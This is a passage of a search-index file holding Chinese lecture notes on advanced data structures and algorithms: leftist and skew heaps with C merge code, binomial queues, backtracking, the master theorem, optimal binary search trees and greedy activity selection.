I_R}\\)</p> <p>\u8861\u91cf\u68c0\u7d22\u7ed3\u679c\u4e2d\u76f8\u5173\u6587\u6863\u7684\u6bd4\u4f8b\u3002</p> </li> <li> <p>\u53ec\u56de\u7387\uff08Recall\uff09\uff1a\\(R = \\frac{R_R}{R_R + R_I}\\)</p> <p>\u8861\u91cf\u76f8\u5173\u6587\u6863\u4e2d\u88ab\u68c0\u7d22\u5230\u7684\u6bd4\u4f8b\u3002</p> </li> </ul>"},{"location":"cs/ads/chapter4/","title":"Leftist Heaps and Skew Heaps","text":""},{"location":"cs/ads/chapter4/#leftist-heaps","title":"Leftist Heaps","text":"<p>Null Path Length</p> <p>\u8282\u70b9\u7684 null path length \u662f\u4ece\u8be5\u8282\u70b9\u5230\u6700\u8fd1\u7684\u6ca1\u6709\u4e24\u4e2a\u513f\u5b50\u7684\u8282\u70b9\u7684\u6700\u77ed\u8def\u5f84\u7684\u957f\u5ea6\u3002\u6709</p> \\[     \\mathrm{NPL}(x) = \\min(\\mathrm{NPL}(\\mathrm{left}(x)), \\mathrm{NPL}(\\mathrm{right}(x))) + 1 \\] <p>\u5b9a\u4e49 \\(\\mathrm{NPL}(\\text{null}) = -1\\)\u3002</p> <p>\u5de6\u504f\u6811\uff08Leftist Heap\uff09\u662f\u4e00\u79cd\u4e8c\u53c9\u5806\uff0c\u5b83\u6ee1\u8db3\u5de6\u504f\u6027\u8d28\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u8282\u70b9 \\(x\\)\uff0c\u5176\u5de6\u5b50\u6811\u7684 npl \u4e0d\u5c0f\u4e8e\u53f3\u5b50\u6811\u7684 npl\u3002</p>"},{"location":"cs/ads/chapter4/#operations","title":"Operations","text":""},{"location":"cs/ads/chapter4/#merge","title":"Merge","text":"<p>\u9009\u53d6\u4e24\u4e2a\u5de6\u504f\u6811\u7684\u6839\u8282\u70b9\u4e2d\u8f83\u5c0f\u7684\u4e00\u4e2a\u4f5c\u4e3a\u65b0\u6839\u8282\u70b9\uff0c\u7136\u540e\u9012\u5f52\u5730\u5c06\u8f83\u5927\u6839\u8282\u70b9\u7684\u53f3\u5b50\u6811\u4e0e\u8f83\u5c0f\u6839\u8282\u70b9\u5408\u5e76\u3002</p> <p>\u5408\u5e76\u540e\uff0c\u5982\u679c\u5de6\u5b50\u6811\u7684 npl \u5c0f\u4e8e\u53f3\u5b50\u6811\u7684 npl\uff0c\u5219\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\uff0c\u7136\u540e\u66f4\u65b0 npl\u3002</p> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>Node *merge(Node *T1, Node *T2) {\n    if (T1 == NULL || T2 == NULL) {\n        return T1 == NULL ? T2 : T1;\n    }\n    if (T1-&gt;key &gt; T2-&gt;key) {\n        swap(T1, T2);\n    }\n    T1-&gt;right = merge(T1-&gt;right, T2);\n    if (T1-&gt;left == NULL || T1-&gt;left-&gt;npl &lt; T1-&gt;right-&gt;npl) {\n        swap(T1-&gt;left, T1-&gt;right);\n    }\n    T1-&gt;npl = T1-&gt;right == NULL ? 0 : T1-&gt;right-&gt;npl + 1;\n    return T1;\n}\n</code></pre>"},{"location":"cs/ads/chapter4/#insertion","title":"Insertion","text":"<p>\u5c06\u65b0\u8282\u70b9\u4f5c\u4e3a\u4e00\u4e2a\u5de6\u504f\u6811\uff0c\u7136\u540e\u4e0e\u539f\u5de6\u504f\u6811\u5408\u5e76\u3002</p>"},{"location":"cs/ads/chapter4/#deletion","title":"Deletion","text":"<p>\u5c06\u6839\u8282\u70b9\u5220\u9664\uff0c\u7136\u540e\u5c06\u5de6\u53f3\u5b50\u6811\u5408\u5e76\u3002</p>"},{"location":"cs/ads/chapter4/#complexity-analysis","title":"Complexity Analysis","text":"<p>\u5de6\u504f\u6811\u7684\u53f3\u8def\u5f84\u957f\u5ea6\u4e0d\u8d85\u8fc7 \\(\\log n\\)\u3002</p> <p>\u8bc1\u660e</p> <p>\u53f3\u8def\u5f84\u957f\u5ea6\u4e3a \\(k\\) \u7684\u5de6\u504f\u6811\u81f3\u5c11\u5305\u542b \\(2^k - 1\\) \u4e2a\u8282\u70b9\uff08\u5f52\u7eb3\u8bc1\u660e\uff09\u3002\u56e0\u6b64\uff0c\u8282\u70b9\u6570\u4e3a \\(n\\) \u7684\u5de6\u504f\u6811\u7684\u53f3\u8def\u5f84\u957f\u5ea6\u4e0d\u8d85\u8fc7 \\(\\log n\\)\u3002</p> <p>\u5408\u5e76\u64cd\u4f5c\u4e3a\u904d\u5386\u53f3\u8def\u5f84\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log n)\\)\u3002</p>"},{"location":"cs/ads/chapter4/#skew-heaps","title":"Skew Heaps","text":"<p>\u659c\u5806\uff08Skew Heap\uff09\u662f\u4e00\u79cd\u4e8c\u53c9\u5806\uff0c\u5b83\u4e0d\u6ee1\u8db3\u5de6\u504f\u6027\u8d28\u3002</p> <p>\u7c7b\u4f3c\u4e8e\u5de6\u504f\u6811\uff0c\u4f46\u659c\u5806\u6bcf\u6b21\u5408\u5e76\u90fd\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\u3002</p>"},{"location":"cs/ads/chapter4/#operations_1","title":"Operations","text":""},{"location":"cs/ads/chapter4/#merge_1","title":"Merge","text":"<p>\u5408\u5e76\u4e4b\u540e\uff0c\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\u3002</p> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>Node *merge(Node *T1, Node *T2) {\n    if (T1 == NULL || T2 == NULL) {\n        return T1 == NULL ? T2 : T1;\n    }\n    if (T1-&gt;key &gt; T2-&gt;key) {\n        swap(T1, T2);\n    }\n    T1-&gt;right = merge(T1-&gt;right, T2);\n    swap(T1-&gt;left, T1-&gt;right);\n    return T1;\n}\n</code></pre>"},{"location":"cs/ads/chapter4/#complexity-analysis_1","title":"Complexity Analysis","text":"<p>\u5747\u644a\u5206\u6790</p> <p>\u8bbe \\(D_i\\) \u4e3a\u7b2c \\(i\\) \u6b21\u64cd\u4f5c\u540e\u7684\u6839\uff0c\u52bf\u80fd\u51fd\u6570 \\(\\Phi(D_i) = \\texttt{\u91cd\u8282\u70b9\u4e2a\u6570}\\)</p> <p>\u91cd\u8282\u70b9</p> <p>\u5b9a\u4e49\u91cd\u8282\u70b9\u4e3a\u53f3\u5b50\u6811\u5927\u5c0f\u5927\u4e8e\u7b49\u4e8e\u5de6\u5b50\u6811\u5927\u5c0f\u7684\u8282\u70b9\u3002</p> <p>\u5b9a\u4e49 \\(H_i = l_i + h_i\\) \u4e3a\u53f3\u8def\u5f84\u4e0a\u8f7b\u8282\u70b9\u4e2a\u6570\u548c\u91cd\u8282\u70b9\u4e2a\u6570\u4e4b\u548c\uff0c\u5373\u53f3\u8def\u5f84\u7684\u957f\u5ea6\u3002</p> <p>\u5c06\u5408\u5e76\u524d\u7684\u4e24\u68f5\u6811\u5206\u522b\u8868\u793a\u4e3a \\(*_1\\) \u548c \\(*_2\\)\u3002</p> <p>\u5408\u5e76\u524d\u7684\u52bf\u80fd\u4e3a \\(\\Phi(D_i) = h_1 + h_2 + h\\)\uff0c\u5176\u4e2d \\(h\\) \u975e\u53f3\u8def\u5f84\u4e0a\u7684\u91cd\u8282\u70b9\u4e2a\u6570\u3002</p> <p>\u5408\u5e76\u540e\uff0c\u7531\u4e8e\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\uff0c\u53f3\u8def\u5f84\u4e0a\u7684\u91cd\u8282\u70b9\u4e00\u5b9a\u4f1a\u53d8\u6210\u8f7b\u8282\u70b9\uff0c\u8f7b\u8282\u70b9\u53ef\u80fd\u53d8\u6210\u91cd\u8282\u70b9\uff0c\u53d6\u4e0a\u754c\u5219\u6709</p> \\[     \\Phi(D_{i+1}) \\leq l_1 + l_2 + h \\] <p>\u5355\u6b21\u5408\u5e76\u7684\u5b9e\u9645\u4ee3\u4ef7 \\(c_i = l_1 + l_2 + h_1 + h_2\\)\uff0c\u5747\u644a\u4ee3\u4ef7\u4e3a</p> \\[     c'_i = c_i + \\Phi(D_{i+1}) - \\Phi(D_i) \\leq 2(l_1 + l_2) \\] <p>\u7531\u4e8e\u8f7b\u8282\u70b9\u4e2a\u6570\u4e3a \\(O(\\log n)\\)\uff0c\u56e0\u6b64\u5747\u644a\u4ee3\u4ef7\u4e3a \\(O(\\log n)\\)\u3002</p>"},{"location":"cs/ads/chapter5/","title":"Binomial Queue","text":""},{"location":"cs/ads/chapter5/#definition","title":"Definition","text":"<p>\u4e8c\u9879\u961f\u5217\u7531\u4e00\u7ec4\u4e8c\u9879\u6811\u7ec4\u6210\u3002\u5ea6\u4e3a \\(k\\) \u7684\u4e8c\u9879\u6811\u6ee1\u8db3\uff1a</p> <ul> <li>\u6ee1\u8db3\u5806\u5e8f\u6027\u8d28\u3002</li> <li>\u6709 \\(2^k\\) \u4e2a\u8282\u70b9\u3002</li> <li>\u6839\u8282\u70b9\u6709 \\(k\\) \u68f5\u5b50\u6811\uff0c\u5206\u522b\u662f\u5ea6\u4e3a \\(0, 1, \\ldots, k-1\\) \u7684\u4e8c\u9879\u6811\u3002</li> </ul>"},{"location":"cs/ads/chapter5/#operations","title":"Operations","text":""},{"location":"cs/ads/chapter5/#merge","title":"Merge","text":""},{"location":"cs/ads/chapter5/#merge-trees","title":"Merge Trees","text":"<p>\u5408\u5e76\u4e24\u68f5\u4e8c\u9879\u6811\uff0c\u8981\u6c42\u5ea6\u5fc5\u987b\u76f8\u7b49\u3002</p> <p>\u9009\u62e9\u952e\u503c\u8f83\u5c0f\u7684\u6839\u8282\u70b9\u4f5c\u4e3a\u65b0\u6839\u8282\u70b9\uff0c\u7136\u540e\u5c06\u53e6\u4e00\u4e8c\u9879\u6811\u4f5c\u4e3a\u65b0\u6839\u8282\u70b9\u7684\u5b50\u6811\u3002</p>"},{"location":"cs/ads/chapter5/#merge-queues","title":"Merge Queues","text":"<p>\u4e8c\u9879\u6811\u7684\u5ea6\u548c\u4e8c\u9879\u961f\u5217\u8282\u70b9\u6570\u7684\u5173\u7cfb</p> <p>\u5047\u8bbe \\(n\\) \u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e3a \\(b_k b_{k-1} \\ldots b_0\\)\uff0c\u5219\u8282\u70b9\u6570\u4e3a \\(n\\) \u7684\u4e8c\u9879\u961f\u5217\uff0c\u82e5 \\(b_i = 1\\)\uff0c\u5219\u5305\u542b\u5ea6\u4e3a \\(i\\) \u7684\u4e8c\u9879\u6811\u3002</p> <p>\u7c7b\u4f3c\u4e8c\u8fdb\u5236\u52a0\u6cd5\uff0c\u540c\u5ea6\u7684\u4e8c\u9879\u6811\u5408\u5e76\uff0c\u82e5\u4ea7\u751f\u8fdb\u4f4d\uff0c\u5219\u5408\u5e76\u5230\u5ea6\u66f4\u9ad8\u7684\u4e8c\u9879\u6811\u3002</p>"},{"location":"cs/ads/chapter5/#insertion","title":"Insertion","text":"<p>\u5c06\u65b0\u8282\u70b9\u4f5c\u4e3a\u5ea6\u4e3a \\(0\\) \u7684\u4e8c\u9879\u6811\uff0c\u7136\u540e\u4e0e\u539f\u4e8c\u9879\u961f\u5217\u5408\u5e76\u3002</p>"},{"location":"cs/ads/chapter5/#deletion","title":"Deletion","text":"<p>\u627e\u5230\u6839\u8282\u70b9\u952e\u503c\u6700\u5c0f\u7684\u4e8c\u9879\u6811\uff0c\u5220\u9664\u6839\u8282\u70b9\uff0c\u7136\u540e\u5c06\u5176\u5b50\u6811\u4f5c\u4e3a\u4e00\u4e2a\u65b0\u7684\u4e8c\u9879\u961f\u5217\uff0c\u4e0e\u539f\u4e8c\u9879\u961f\u5217\u5408\u5e76\u3002</p>"},{"location":"cs/ads/chapter5/#complexity-analysis","title":"Complexity Analysis","text":"<p>\u4e8c\u9879\u6811\u5408\u5e76\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(1)\\)\uff0c\u5355\u6b21\u4e8c\u9879\u961f\u5217\u5408\u5e76\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log n)\\)\u3002</p>"},{"location":"cs/ads/chapter5/#amortized-analysis","title":"Amortized Analysis","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u7a7a\u7684\u4e8c\u9879\u961f\u5217\uff0c\u63d2\u5165 \\(n\\) \u4e2a\u8282\u70b9\u3002</p> <p>\u8bbe \\(c_i, c'_i\\) \u5206\u522b\u8868\u793a\u63d2\u5165 \\(i\\) \u4e2a\u8282\u70b9\u7684\u5b9e\u9645\u4ee3\u4ef7\u548c\u5747\u644a\u4ee3\u4ef7\uff0c\u52bf\u80fd\u51fd\u6570 \\(\\Phi_i\\) \u5b9a\u4e49\u4e3a\u7b2c \\(i\\) \u6b21\u63d2\u5165\u540e\u4e8c\u9879\u961f\u5217\u4e2d\u4e8c\u9879\u6811\u7684\u4e2a\u6570\u3002</p> <p>Note</p> <p>\u5b9e\u9645\u4ee3\u4ef7\u4e3a \\(c\\) \u7684\u4e00\u6b21\u63d2\u5165\u4f1a\u5bfc\u81f4\u52bf\u80fd\u589e\u52a0 \\(2-c\\)\u3002\u5206\u7c7b\u8ba8\u8bba\uff1a</p> <ul> <li>\u82e5\u63d2\u5165\u4e0d\u4ea7\u751f\u8fdb\u4f4d\uff0c\u5b9e\u9645\u4ee3\u4ef7\u4e3a \\(1\\)\uff0c\u52bf\u80fd\u589e\u52a0 \\(1\\)\u3002</li> <li>\u82e5\u63d2\u5165\u4ea7\u751f\u8fdb\u4f4d\uff0c\u8fdb\u4f4d\u6b21\u6570\u4e3a \\(k\\)\uff0c\u5b9e\u9645\u4ee3\u4ef7\u4e3a \\(k+1\\)\uff0c\u52bf\u80fd\u589e\u52a0 \\(1-k\\)\u3002</li> </ul> <p>\u6709 \\(c'_i = c_i + \\Phi_{i+1} - \\Phi_i = 2\\)\uff0c\u5373\u603b\u4ee3\u4ef7\u4e3a \\(T(n) = 2n\\)\uff0c\u5747\u644a\u4ee3\u4ef7\u4e3a \\(O(1)\\)\u3002</p>"},{"location":"cs/ads/chapter6/","title":"Backtracking","text":""},{"location":"cs/ads/chapter6/#turnpike-problem","title":"Turnpike Problem","text":"<p>\u7ed9\u5b9a\u4e00\u7ec4\u70b9\u7684\u4e24\u4e24\u95f4\u7684\u8ddd\u79bb \\(\\{d_i\\}\\)\uff0c\u6c42\u8fd9\u4e9b\u70b9\u7684\u4f4d\u7f6e\u3002</p> <ol> <li>\u5c06\u8ddd\u79bb \\(\\{d_i\\}\\) \u6392\u5e8f\uff0c\u6700\u5927\u7684\u8ddd\u79bb\u4e3a \\(d_n\\)\u3002</li> <li>\u786e\u5b9a\u7b2c\u4e00\u4e2a\u70b9\u7684\u4f4d\u7f6e\u4e3a 0\uff0c\u5219\u6700\u8fdc\u7684\u70b9\u7684\u4f4d\u7f6e\u4e3a \\(d_n\\)\u3002</li> <li>\u4ece\u5927\u5230\u5c0f\u9009\u53d6\u8ddd\u79bb \\(d_i\\)\uff0c\u53ea\u80fd\u653e\u5728 \\(d_i\\) \u548c \\(d_n - d_i\\) \u5904\uff0c\u8fdb\u884c\u641c\u7d22\u3002\u82e5\u65b0\u7684\u70b9\u548c\u5df2\u7ecf\u786e\u5b9a\u7684\u70b9\u7684\u8ddd\u79bb\u4e0d\u5728\u8ddd\u79bb\u96c6\u5408\u5185\uff0c\u5219\u526a\u679d\u3002</li> </ol>"},{"location":"cs/ads/chapter6/#minimax-strategy","title":"Minimax Strategy","text":"<p>\u5728\u7c7b\u4f3c\u4e0b\u68cb\u7684\u641c\u7d22\u4e2d\uff0c\u4f7f\u7528 Minimax \u7b56\u7565\uff0c\u6700\u5927\u5316\u81ea\u5df1\u7684\u5229\u76ca\uff0c\u540c\u65f6\u6700\u5c0f\u5316\u5bf9\u624b\u7684\u5229\u76ca\u3002</p>"},{"location":"cs/ads/chapter6/#-pruning","title":"\u03b1-\u03b2 Pruning","text":"<p>\u6bcf\u4e2a\u8282\u70b9\u7ef4\u62a4 \\( \\alpha \\) \u548c \\( \\beta \\) \u4e24\u4e2a\u503c\uff0c\u5206\u522b\u8868\u793a\u5f53\u524d\u5b50\u6811\u6536\u76ca\u7684\u4e0a\u754c\u548c\u4e0b\u754c\u3002</p> <p>\u5728\u641c\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u7ee7\u7eed\u641c\u7d22\u5bf9\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u610f\u4e49\uff0c\u53ef\u4ee5\u8fdb\u884c\u526a\u679d\u3002</p>"},{"location":"cs/ads/chapter7/","title":"Divide and Conquer","text":"<p>General recurrence: \\(T(n) = aT(n/b) + f(n)\\)</p>"},{"location":"cs/ads/chapter7/#closest-points-problem","title":"Closest Points Problem","text":"<p>\u5e73\u9762\u4e0a N \u4e2a\u70b9\uff0c\u627e\u5230\u6700\u8fd1\u7684\u70b9\u5bf9\u3002</p> <p>\u6309\u7167 x \u5750\u6807\u6392\u5e8f\uff0c\u5206\u6cbb\u5730\u627e\u5230\u5de6\u53f3\u4e24\u8fb9\u7684\u6700\u8fd1\u70b9\u5bf9\uff0c\u7136\u540e\u627e\u5230\u8de8\u8d8a\u4e2d\u7ebf\u7684\u6700\u8fd1\u70b9\u5bf9\u3002</p> <p>\u8bbe\u5de6\u53f3\u4e24\u8fb9\u7684\u6700\u8fd1\u70b9\u5bf9\u8ddd\u79bb\u4e3a \\(d\\)\uff0c\u8bbe\u4e2d\u7ebf\u4e3a \\(c\\)\uff0c\u8bbe \\(T_l\\) \u4e3a\u5de6\u8fb9\u8ddd\u79bb\u4e2d\u7ebf\u5c0f\u4e8e \\(d\\) \u7684\u70b9\u96c6\uff0c\\(T_r\\) \u4e3a\u53f3\u8fb9\u8ddd\u79bb\u4e2d\u7ebf\u5c0f\u4e8e \\(d\\) \u7684\u70b9\u96c6\u3002</p> <p>\u8bbe \\(p_l \\in S_l, p_r \\in S_r\\) \u6ee1\u8db3 \\(\\mathrm{dist}(p_l, p_r) &lt; d\\)\uff0c\u5219</p> <ul> <li>\\(p_l \\in T_l, p_r \\in T_r\\)</li> <li>\\(p_l, p_r\\) \u4e00\u5b9a\u5728\u4ee5\u4e2d\u7ebf\u4e3a\u5bf9\u79f0\u8f74\uff0c\u5bbd\u5ea6\u4e3a \\(2d\\) \uff0c\u9ad8\u5ea6\u4e3a \\(d\\) \u7684\u77e9\u5f62 \\(R\\) \u5185</li> <li>\\(R\\) \u5185\u6700\u591a\u6709 8 \u4e2a\u70b9\uff0c\u5206\u522b\u5728\u4e24\u8fb9 \\(d\\times d\\) \u7684\u77e9\u5f62\u7684\u56db\u4e2a\u89d2\u4e0a</li> </ul> <p>\u5219\u5c06 \\(T_l, T_r\\) \u4e2d\u7684\u70b9\u6309\u7167 y \u5750\u6807\u6392\u5e8f\u4e3a \\((p_n)\\)\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u70b9 \\(p_i\\)\uff0c\u53ea\u9700\u8981\u679a\u4e3e \\(p_{i+1}, \\cdots, p_{i+7}\\) \u5373\u53ef\u3002</p>"},{"location":"cs/ads/chapter7/#time-complexity","title":"Time Complexity","text":"<p>\\(T(n) = aT(n/b) + f(n)\\)</p>"},{"location":"cs/ads/chapter7/#substitution-method","title":"Substitution Method","text":"<p>\u731c\u6d4b\uff0c\u7136\u540e\u4ee3\u5165\u8bc1\u660e\u3002</p> <p>Example</p> \\[ T(n) = 2T(\\lfloor n/2 \\rfloor) + n \\] <p>\u731c\u6d4b \\(T(n) = O(n\\log n)\\)\u3002</p> <p>\u5047\u8bbe\u5bf9\u4e8e \\(m &lt; n\\)\uff0c\u6709 \\(T(m) \\leq cm\\log m\\)\uff0c\u5219 \\(T(\\lfloor n/2 \\rfloor) \\leq c\\lfloor n/2 \\rfloor \\log \\lfloor n/2 \\rfloor\\)\u3002</p> <p>\u4ee3\u5165\u5f97\u5230</p> \\[ \\begin{aligned} T(n) &amp;\\leq 2c\\lfloor n/2 \\rfloor \\log \\lfloor n/2 \\rfloor + n \\\\ &amp;\\leq cn(\\log n - \\log 2) + n \\\\ &amp;\\leq cn\\log n, \\quad c \\geq 1 \\end{aligned} \\] <p>\u6240\u4ee5 \\(T(n) = O(n\\log n)\\)\u3002</p>"},{"location":"cs/ads/chapter7/#recursion-tree","title":"Recursion Tree","text":"<p>\u753b\u51fa\u9012\u5f52\u6811\uff0c\u7136\u540e\u6c42\u548c\uff0c\u7136\u540e\u8bc1\u660e\u3002</p> <p>Example</p> \\[ T(n) = 3T(n/4) + \\Theta(n^2) \\] <p>\u9012\u5f52\u6811\u5982\u4e0b\uff1a</p> <p></p> \\[ T(n) = \\sum_{i=0}^{\\log_4 n - 1} (3/16)^i cn^2 + \\Theta(n^{\\log_4 3}) = O(n^2) \\] <p>\u518d\u4ee3\u5165\u8bc1\u660e</p> <p>Example</p> \\[ T(n) = T(n/3) + T(2n/3) + \\Theta(n) \\]"},{"location":"cs/ads/chapter7/#master-theorem","title":"Master Theorem","text":"<p>\u8bbe \\(a \\geq 1, b &gt; 1\\)\uff0c\\(T(n) = aT(n/b) + f(n)\\)\u3002</p> <ol> <li>\u5982\u679c \\(f(n) = O(n^{\\log_b a - \\epsilon})\\)\uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_b a})\\)\u3002</li> <li>\u5982\u679c \\(f(n) = \\Theta(n^{\\log_b a})\\)\uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_b a}\\log n)\\)\u3002</li> <li> <p>\u5982\u679c \\(f(n) = \\Omega(n^{\\log_b a + \\epsilon})\\)\uff0c\u4e14\u5bf9\u4e8e\u67d0\u4e2a\u5e38\u6570 \\(c &lt; 1\\) \u548c\u6240\u6709\u8db3\u591f\u5927\u7684 \\(n\\) \u6709 \\(af(n/b) \\leq cf(n)\\)\uff0c\u5219 \\(T(n) = \\Theta(f(n))\\)\u3002</p> </li> <li> <p>\u60c5\u51b5 1 \u8868\u793a\u9012\u5f52\u6811\u4e2d\u53f6\u5b50\u8282\u70b9\u7684\u5f00\u9500\u5360\u636e\u4e3b\u5bfc\uff0c\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u53f6\u5b50\u4e2a\u6570 \\(n^{\\log_b a}\\) \u76f8\u5173\uff0c\u4e3a \\(O(n^{\\log_b a})\\)\u3002</p> </li> <li>\u60c5\u51b5 3 \u8868\u793a\u9012\u5f52\u6811\u4e2d\u6839\u8282\u70b9\u7684\u5f00\u9500\u5360\u636e\u4e3b\u5bfc\uff0c\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u6839\u8282\u70b9\u7684\u5f00\u9500 \\(f(n)\\) \u76f8\u5173\uff0c\u4e3a \\(O(f(n))\\)\u3002</li> <li>\u60c5\u51b5 2 \u8868\u793a\u9012\u5f52\u6811\u4e2d\u6839\u8282\u70b9\u548c\u53f6\u5b50\u8282\u70b9\u7684\u5f00\u9500\u76f8\u5f53\uff0c\u603b\u590d\u6742\u5ea6\u4e3a \\(O(n^{\\log_b a}\\log n)\\)\u3002</li> </ol> <p>\\(\\log n\\) \u6e10\u8fdb\u5c0f\u4e8e \\(n^{\\epsilon}\\)</p>"},{"location":"cs/ads/chapter7/#another-form","title":"Another Form","text":"<p>Form 1</p> <ol> <li>\u5982\u679c \\(af(n/b) = \\kappa f(n)\\)\uff0c\u5176\u4e2d \\(\\kappa &lt; 1\\)\uff0c\u5219 \\(T(n) = \\Theta(f(n))\\)\u3002\uff08\u5206\u89e3\u4efb\u52a1\u7684\u5f00\u9500\u5c0f\u4e8e\u5408\u5e76\u4efb\u52a1\u7684\u5f00\u9500\uff09</li> <li>\u5982\u679c \\(af(n/b) = K f(n)\\)\uff0c\u5176\u4e2d \\(K &gt; 1\\)\uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_b a})\\)\u3002\uff08\u5206\u89e3\u4efb\u52a1\u7684\u5f00\u9500\u5927\u4e8e\u5408\u5e76\u4efb\u52a1\u7684\u5f00\u9500\uff09</li> <li>\u5982\u679c \\(af(n/b) = f(n)\\)\uff0c\u5219 \\(T(n) = \\Theta(f(n)\\log_b n)\\)\u3002\uff08\u5206\u89e3\u4efb\u52a1\u548c\u5408\u5e76\u4efb\u52a1\u7684\u5f00\u9500\u76f8\u5f53\uff09</li> </ol> <p>Form 2</p> <p>\\(T(n) = aT(n/b) + \\Theta(n^k\\log^p n)\\)\u3002</p> <ol> <li>\u5982\u679c \\(a &gt; b^k\\)\uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_b a})\\)\u3002</li> <li>\u5982\u679c \\(a = b^k\\)\uff0c\u5219 \\(T(n) = \\Theta(n^k\\log^{p+1} n)\\)\u3002</li> <li>\u5982\u679c \\(a &lt; b^k\\)\uff0c\u5219 \\(T(n) = \\Theta(n^k\\log^p n)\\)\u3002</li> </ol>"},{"location":"cs/ads/chapter8/","title":"Dynamic Programming","text":""},{"location":"cs/ads/chapter8/#optimal-binary-search-tree","title":"Optimal Binary Search Tree","text":"<p>N \u4e2a\u8bcd\uff0c\u6309\u7167\u5b57\u5178\u5e8f\u6392\u5217 \\(w_1, w_2, \\cdots, w_N\\)\uff0c\u6bcf\u4e2a\u8bcd \\(w_i\\) \u7684\u88ab\u68c0\u7d22\u5230\u7684\u6982\u7387\u4e3a \\(p_i\\)\uff0c\u6c42\u4e00\u68f5\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u4f7f\u5f97\u68c0\u7d22\u7684\u671f\u671b\u4ee3\u4ef7\u6700\u5c0f\u3002</p> <p>\u5373\u6700\u5c0f\u5316 \\(\\sum_{i=1}^N p_i (d_i + 1)\\)\uff0c\u5176\u4e2d \\(d_i\\) \u4e3a \\(w_i\\) \u5728\u6811\u4e2d\u7684\u6df1\u5ea6\u3002</p> <p>\u8bbe</p> <ul> <li>\\(T_{ij}\\) \u4e3a \\(w_i, w_{i+1}, \\cdots, w_j\\) \u7684\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811</li> <li>\\(c_{ij}\\) \u4e3a \\(T_{ij}\\) \u7684\u4ee3\u4ef7</li> </ul> <p>\u5219\u6709</p> \\[ c_{ij} = \\min_{i \\leq r \\leq j} \\left\\{ c_{i,r-1} + c_{r+1,j} + \\sum_{k=i}^j p_k \\right\\} \\] <p>\u4e14 \\(c_{ii} = p_i\\)\u3002</p>"},{"location":"cs/ads/chapter9/","title":"Greedy Problem","text":""},{"location":"cs/ads/chapter9/#activity-selection-problem","title":"Activity Selection Problem","text":"<p>\u6709\u4e00\u4e9b\u6d3b\u52a8\uff0c\u6bcf\u4e2a\u6d3b\u52a8\u6709\u4e00\u4e2a\u5f00\u59cb\u65f6\u95f4 \\(s_i\\) \u548c\u7ed3\u675f\u65f6\u95f4 \\(f_i\\)\uff0c\u53ea\u6709\u4e00\u4e2a\u8d44\u6e90\uff0c\u6bcf\u4e2a\u6d3b\u52a8\u5360\u7528\u8d44\u6e90\uff0c\u95ee\u6700\u591a\u80fd\u5b89\u6392\u591a\u5c11\u4e2a\u6d3b\u52a8\u3002</p> <p>\u6309\u7167 \\(s_i\\) \u6392\u5e8f\u3002</p>"},{"location":"cs/ads/chapter9/#dynamic-programming","title":"Dynamic Programming","text":"<p>\u8bbe \\(c_{i}\\) \u4e3a\u6d3b\u52a8\u96c6\u5408 \\(\\{a_1, a_2, \\cdots, a_i\\}\\) \u7684\u4e2d\u6700\u591a\u80fd\u5b89\u6392\u7684\u6d3b\u52a8\u6570\u3002\u5219\u6709</p> \\[ c_i = \\max \\left\\{ c_{i-1}, 1 + c_{j} \\right\\} \\] <p>\u5176\u4e2d \\(j\\) \u4e3a\u6700\u540e\u4e00\u4e2a \\(f_j \\leq s_i\\) \u7684\u6d3b\u52a8\u3002</p>"},{"location":"cs/ads/chapter9/#greedy-algorithm","title":"Greedy Algorithm","text":"<p>\u4ece\u524d\u5f80\u540e\u626b\u63cf\uff0c\u6bcf\u6b21\u9009\u62e9\u4e0d\u51b2\u7a81\u7684\u6700\u65e9\u7ed3\u675f\u7684\u6d3b\u52a8\u3002</p> <p>\u52a0\u6743\u6d3b\u52a8\u9009\u62e9\u95ee\u9898</p> <p>\u6bcf\u4e2a\u6d3b\u52a8\u6709\u6743\u91cd\uff0c\u8981\u6c42\u6700\u5927\u5316\u6743\u91cd\u3002</p> <p>\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u6c42\u89e3\u3002</p> <p>\u533a\u95f4\u8c03\u5ea6\u95ee\u9898</p> <p>\u6240\u6709\u6d3b\u52a8\u5fc5\u987b\u4e3e\u529e\uff0c\u6c42\u6700\u5c11\u9700\u8981\u591a\u5c11\u8d44\u6e90\u3002</p> <p>\u5148\u6309\u7167\u5f00\u59cb\u65f6\u95f4\u6392\u5e8f\uff0c\u521d\u59cb\u8d44\u6e90\u6570\u91cf\u4e3a 1\uff0c\u6bcf\u6b21\u5982\u679c\u6240\u6709\u6d3b\u52a8\u90fd\u51b2\u7a81\uff0c\u5219\u8d44\u6e90\u6570\u91cf\u52a0 1\uff0c\u5426\u5219\u52a0\u5165\u5230\u4e0d\u51b2\u7a81\u7684\u6d3b\u52a8\u4e2d\u3002</p>"},{"location":"cs/ads/chapter9/#huffman-coding","title":"Huffman Coding","text":"<p>\u7ed9\u5b9a\u4e00\u7ec4\u5b57\u7b26 \\(C\\) \u53ca\u5176\u9891\u7387\uff0c\u6784\u9020\u4e00\u4e2a\u4e8c\u53c9 Trie\uff0c\u4f7f\u5f97\u671f\u671b\u7f16\u7801\u957f\u5ea6\u6700\u77ed\u3002</p> 